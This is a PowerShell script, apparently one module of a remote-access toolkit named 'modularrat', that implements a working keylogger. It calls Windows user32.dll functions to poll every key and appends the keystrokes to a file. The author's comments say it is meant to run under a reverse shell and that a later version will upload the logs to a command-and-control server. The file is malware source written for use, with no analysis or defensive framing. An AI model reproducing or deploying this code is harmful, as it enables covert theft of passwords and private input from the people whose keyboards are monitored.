function title {
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
    | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
    |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
    " -ForegroundColor Yellow
    Write-Host "
                        Module : File Handler
    " -ForegroundColor Blue
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host ""
 }


#requires -Version 2
function Start-KeyLogger($name) {

    begin {
        $file_name = If ($name) { $name }else { Read-Host "Enter the file name  to save the keylogs captured" }
        $path = "$(Get-Location)\$file_name"

        # Signatures for API Calls
        $signatures = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@

        # load signatures and make members available
        $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
        # create output file
        $file = New-Item -Path $path -ItemType File -Force

        Write-Host ""
        Write-Host "Starting keylogger..." -ForegroundColor Yellow
    }
    process {
        while ($true) {
            Start-Sleep -Milliseconds 40
      
            # scan all ASCII codes above 8
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                # get current key state
                $state = $API::GetAsyncKeyState($ascii)

                # is key pressed?
                #will want another key instead of ctrl + c, because it will close my reverse shell
                if ($state -eq -32767) {
                    $file = [console]::CapsLock

                    # translate scan code to real code
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    # get keyboard state for virtual keys
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    # prepare a StringBuilder to receive input key
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    # translate virtual key
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success) {
                        # add key to logger file
                        [System.IO.File]::AppendAllText($path, $mychar, [System.Text.Encoding]::Unicode) 
                    }
                }
            }
        }
    }
    end {
        # open logger file in Notepad
        #will want instead to upload the file to my c2
        notepad $path
    }
}

function run($name) {
    title
    Start-KeyLogger($name)
}

run($args[0])
